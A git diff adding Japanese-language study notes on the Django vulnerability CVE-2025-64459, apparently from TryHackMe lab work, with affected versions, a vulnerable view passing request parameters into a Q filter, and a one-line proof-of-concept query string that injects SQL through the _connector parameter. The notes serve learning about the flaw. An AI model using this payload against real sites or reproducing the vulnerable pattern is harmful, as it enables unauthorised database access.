@@ -1,5 +1,34 @@
 # CVE
 
+## [CVE-2025-64459](https://nvd.nist.gov/vuln/detail/CVE-2025-64459) (Django)
+
+https://tryhackme.com/room/djangocve202564459
+
+`5.1 before 5.1.14, 4.2 before 4.2.26, and 5.2 before 5.2.8`
+
+- クエリによく使われる filter(), exclude(), get() などは、`**kwargs` 引数を取る。`User.objects.filter(username='admin')` のような形。
+- ユーザー入力を辞書に変換してORMに渡すとき、`User.objects.filter(**request.GET.dict())` という形が使われることがある。
+- セキュリティパッチ適用前は、`_connector`, `_negated` が適切に制限されていなかった。
+
+バックエンドコード
+
+```python
+def post_list(request):
+  query_params = dict(request.GET.items())
+  if not any(param.startswith('is_published') for param in query_params.keys()):
+      query_params['is_published'] = True
+  if not any(param.startswith('id') for param in query_params.keys()):
+      query_params['id__lt'] = 10
+  q_filter = Q(**query_params)
+  posts = Post.objects.filter(q_filter)
+```
+
+PoC
+
+```
+/?author=dummy&_connector=OR%201=1%20OR
+```
+
 ## CVE-2025-49113 (Roundcube)
 
 https://tryhackme.com/room/roundcubecve202549113
